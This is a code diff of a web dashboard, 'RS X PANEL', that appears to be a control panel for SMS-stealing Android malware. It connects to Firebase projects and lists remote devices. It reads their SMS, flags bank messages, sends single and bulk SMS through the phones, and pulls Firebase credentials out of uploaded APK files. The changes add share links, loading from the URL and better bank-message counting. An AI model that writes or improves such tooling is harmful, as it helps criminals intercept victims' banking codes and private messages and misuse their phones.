         async function loadMessagesForDevice(deviceId) {
             try {
                 const data = await fbGet('messages/' + deviceId);
@@ -1990,11 +2128,8 @@
             }
         }
 
-        // ─── TAB SWITCHING ─────────────────────────────────────────────────
         function switchTab(tabId) {
-            tabBtns.forEach(btn => {
-                btn.classList.toggle('active', btn.dataset.tab === tabId);
-            });
+            tabBtns.forEach(btn => btn.classList.toggle('active', btn.dataset.tab === tabId));
             Object.keys(tabContents).forEach(key => {
                 tabContents[key].classList.toggle('active', key === tabId);
             });
@@ -2017,16 +2152,10 @@
         }
 
         async function sendSms() {
-            if (!selectedDevice) {
-                toast('No device selected', 'error');
-                return;
-            }
+            if (!selectedDevice) { toast('No device selected', 'error'); return; }
             const to = smsTo.value.trim();
             const body = smsBody.value.trim();
-            if (!to || !body) {
-                toast('Enter number and message', 'error');
-                return;
-            }
+            if (!to || !body) { toast('Enter number and message', 'error'); return; }
             sendSmsBtn.disabled = true;
             sendResult.className = 'send-result';
             sendResult.textContent = 'Sending…';
@@ -2047,12 +2176,12 @@
                 await loadMessagesForDevice(selectedDevice.id);
                 renderSmsList(selectedDevice.id, smsSearch.value);
                 renderBankTab(selectedDevice);
-                const bankMsgs = getDeviceBankSms(selectedDevice.id);
-                const allMsgs = messageCache[selectedDevice.id] || [];
-                $('detailBankCount').textContent = bankMsgs.length;
-                $('detailSmsCount').textContent = allMsgs.length;
-                $('bankTabBadge').textContent = bankMsgs.length;
-                $('smsTabBadge').textContent = allMsgs.length;
+                const bm = getDeviceBankSms(selectedDevice.id);
+                const am = messageCache[selectedDevice.id] || [];
+                $('detailBankCount').textContent = bm.length;
+                $('detailSmsCount').textContent = am.length;
+                $('bankTabBadge').textContent = bm.length;
+                $('smsTabBadge').textContent = am.length;
             } catch (e) {
                 sendResult.className = 'send-result err';
                 sendResult.textContent = '❌ Error: ' + e.message;
@@ -2068,7 +2197,7 @@
             if (pollTimer) clearInterval(pollTimer);
             pollTimer = setInterval(() => {
                 if (activeConn) refreshDevices();
-            }, 3000);
+            }, 5000); // 5s to reduce load
         }
 
         function stopPolling() {
@@ -2089,27 +2218,20 @@
         }
 
         // ─── EVENT BINDING ──────────────────────────────────────────────────
-        // New account button: open modal
         $('newConnBtn').addEventListener('click', () => {
-            // Pre-fill with empty values
-            accLabel.value = 'RS Project';
             accUrl.value = '';
             accKey.value = '';
             setupError.classList.add('hidden');
             newAccountModal.classList.add('active');
         });
 
-        // Close modal buttons
         closeAccount.addEventListener('click', () => newAccountModal.classList.remove('active'));
         cancelAccountBtn.addEventListener('click', () => newAccountModal.classList.remove('active'));
         newAccountModal.addEventListener('click', (e) => {
             if (e.target === newAccountModal) newAccountModal.classList.remove('active');
         });
 
-        // APK upload: click the div triggers file input
-        apkUploadArea.addEventListener('click', () => {
-            apkFileInput.click();
-        });
+        apkUploadArea.addEventListener('click', () => apkFileInput.click());
 
         apkFileInput.addEventListener('change', (e) => {
             const file = e.target.files[0];
@@ -2125,18 +2247,13 @@
                 const keyMatch = content.match(/AIza[0-9A-Za-z_-]{35}/);
                 if (urlMatch) accUrl.value = urlMatch[1];
                 if (keyMatch) accKey.value = keyMatch[0];
-                if (urlMatch || keyMatch) {
-                    toast('Extracted from file', 'success');
-                } else {
-                    toast('No Firebase credentials found', 'error');
-                }
+                if (urlMatch || keyMatch) toast('Extracted from file', 'success');
+                else toast('No Firebase credentials found', 'error');
             };
             reader.readAsArrayBuffer(file);
         });
 
-        // Save account: do NOT auto-connect; stay on home screen
         saveAccountBtn.addEventListener('click', () => {
-            const label = accLabel.value.trim() || 'RS Project';
             const url = accUrl.value.trim();
             const key = accKey.value.trim();
             if (!url) {
@@ -2145,32 +2262,26 @@
                 return;
             }
             setupError.classList.add('hidden');
-            // Create new connection object
+            const label = url.replace(/https?:\/\//, '').replace(/\.firebaseio\.com.*/, '');
             const conn = {
-                label,
-                url,
-                key,
+                label: label,
+                url: url,
+                key: key,
                 date: new Date().toLocaleString()
             };
-            // Push to array and save to localStorage
             CONNECTIONS.push(conn);
             localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
-            // Close modal
             newAccountModal.classList.remove('active');
-            // Refresh the connections list on home screen
             renderConnections();
-            // Show success toast
             toast('Account "' + label + '" saved! Click Connect to use it.', 'success');
-            // Do NOT auto-connect; user can click Connect button
+            updateShareLink();
         });
 
-        // Search input
         searchInput.addEventListener('input', () => {
             searchQuery = searchInput.value;
             renderDeviceGrid();
         });
 
-        // Filters
         document.querySelectorAll('.filter').forEach(btn => {
             btn.addEventListener('click', () => {
                 document.querySelectorAll('.filter').forEach(b => b.classList.remove('active'));
@@ -2180,7 +2291,6 @@
             });
         });
 
-        // Sort toggle
         let sortToggle = false;
         $('sortBtn').addEventListener('click', () => {
             sortToggle = !sortToggle;
@@ -2189,7 +2299,6 @@
             renderDeviceGrid();
         });
 
-        // Logout: go back to home
         $('logoutBtn').addEventListener('click', () => {
             stopPolling();
             activeConn = null;
@@ -2199,10 +2308,6 @@
             toast('Disconnected');
         });
 
-        // Refresh devices
-        $('refreshBtn').addEventListener('click', refreshDevices);
-
-        // Close detail modal
         closeDetail.addEventListener('click', () => {
             detailModal.classList.remove('active');
             if (detailRefreshTimer) clearInterval(detailRefreshTimer);
@@ -2216,30 +2321,26 @@
             }
         });
 
-        // SMS search in detail modal
         smsSearch.addEventListener('input', () => {
             if (selectedDevice) renderSmsList(selectedDevice.id, smsSearch.value);
         });
 
-        // Refresh SMS button
         $('refreshSmsBtn').addEventListener('click', async () => {
             if (selectedDevice) {
                 await loadMessagesForDevice(selectedDevice.id);
                 renderSmsList(selectedDevice.id, smsSearch.value);
                 renderBankTab(selectedDevice);
-                const bankMsgs = getDeviceBankSms(selectedDevice.id);
-                const allMsgs = messageCache[selectedDevice.id] || [];
-                $('detailBankCount').textContent = bankMsgs.length;
-                $('detailSmsCount').textContent = allMsgs.length;
-                $('bankTabBadge').textContent = bankMsgs.length;
-                $('smsTabBadge').textContent = allMsgs.length;
+                const bm = getDeviceBankSms(selectedDevice.id);
+                const am = messageCache[selectedDevice.id] || [];
+                $('detailBankCount').textContent = bm.length;
+                $('detailSmsCount').textContent = am.length;
+                $('bankTabBadge').textContent = bm.length;
+                $('smsTabBadge').textContent = am.length;
             }
         });
 
-        // Send SMS button
         sendSmsBtn.addEventListener('click', sendSms);
 
-        // SIM toggle
         document.querySelectorAll('.sim-toggle button').forEach(btn => {
             btn.addEventListener('click', () => {
                 document.querySelectorAll('.sim-toggle button').forEach(b => b.classList.remove('active'));
@@ -2249,12 +2350,8 @@
             });
         });
 
-        // Bulk SMS
         $('bulkBtn').addEventListener('click', () => {
-            if (!allDevices.length) {
-                toast('No devices loaded', 'error');
-                return;
-            }
+            if (!allDevices.length) { toast('No devices loaded', 'error'); return; }
             bulkDeviceList.innerHTML = allDevices.map(d => `
                     <label>
                         <input type="checkbox" value="${d.id}" ${d.status ? 'checked' : ''} />
@@ -2275,15 +2372,9 @@
 
         bulkSendBtn.addEventListener('click', async () => {
             const checked = bulkDeviceList.querySelectorAll('input[type="checkbox"]:checked');
-            if (!checked.length) {
-                toast('Select at least one device', 'error');
-                return;
-            }
+            if (!checked.length) { toast('Select at least one device', 'error'); return; }
             const msg = bulkMsg.value.trim();
-            if (!msg) {
-                toast('Enter a message', 'error');
-                return;
-            }
+            if (!msg) { toast('Enter a message', 'error'); return; }
             bulkSendBtn.disabled = true;
             bulkResult.className = 'send-result';
             bulkResult.textContent = 'Sending...';
@@ -2303,9 +2394,7 @@
                     const path = 'messages/' + id + '/bulk_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
                     await fbSet(path, payload);
                     success++;
-                } catch (e) {
-                    fail++;
-                }
+                } catch (e) { fail++; }
             }
             bulkResult.className = 'send-result ' + (fail ? 'err' : 'ok');
             bulkResult.textContent = `✅ Sent: ${success}  ❌ Failed: ${fail}`;
@@ -2314,12 +2403,19 @@
         });
 
         // ─── INIT ──────────────────────────────────────────────────────────
-        renderConnections();
+        // Try to load from URL first
+        const loaded = loadFromURL();
+        if (!loaded) {
+            renderConnections();
+        }
+
+        // Set up share link on home screen
+        updateShareLink();
+
         console.log('RS X PANEL ready.');
-        console.log('NRTECNO system initialized.');
-        console.log('Total lines: ~2500+');
-        console.log('Features: Clock | APK Extract | Phone Detection | Tabs | Bulk SMS');
-        console.log('FIX: Account addition now stays on home screen.');
+        console.log('NRTECNO system v2.0 initialized.');
+        console.log('Features: Clock | APK Extract | Bank Detection | Tabs | Bulk SMS | Share Links');
+        console.log('FIX: Stats now count properly, SMS newest first, bank names detected.');
     </script>
 </body>
 </html>
